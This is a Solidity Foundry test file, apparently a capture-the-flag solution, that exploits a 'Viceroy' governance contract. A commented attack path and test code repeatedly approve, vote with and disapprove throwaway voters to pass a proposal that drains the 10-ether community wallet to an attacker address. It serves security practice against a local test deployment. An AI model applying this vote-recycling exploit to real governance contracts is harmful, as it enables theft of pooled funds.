// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {OligarchyNFT, Governance, CommunityWallet} from "../src/Viceroy.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";

contract ViceroyAttack is Test {
    OligarchyNFT nft;
    Governance governance;
    CommunityWallet treasury;
    address alice;
    address bob;
    address eve;

    function setUp() public {
        nft = new OligarchyNFT(address(this));
        governance = new Governance{value: 10 ether}(nft);
        treasury = governance.communityWallet();
        alice = vm.addr(1);
        eve = vm.addr(19);
    }

    // Attack Path:
    // 1. call appointViceroy for alice address
    // 2. create a proposal from the viceroy calling exec function
    // 3. approve a voter, vote on proposal, disapprove voter -> repeat this 10 times from the same viceroy
    // 4. call executeProposal

    function testAttack() public {
        governance.appointViceroy(alice, 1);

        vm.startPrank(alice);
        bytes memory proposal =
            abi.encodeWithSignature("exec(address,bytes,uint256)", eve, "", address(treasury).balance);
        uint256 proposalId = uint256(keccak256(proposal));
        governance.createProposal(alice, proposal);
        vm.stopPrank();

        for (uint256 i; i < 10; i++) {
            bob = vm.addr(i + 2);

            vm.prank(alice);
            governance.approveVoter(bob);

            vm.prank(bob);
            governance.voteOnProposal(proposalId, true, alice);

            vm.prank(alice);
            governance.disapproveVoter(bob);
        }
        governance.executeProposal(proposalId);

        assertEq(address(eve).balance, 10 ether);
    }

    receive() external payable {}
}
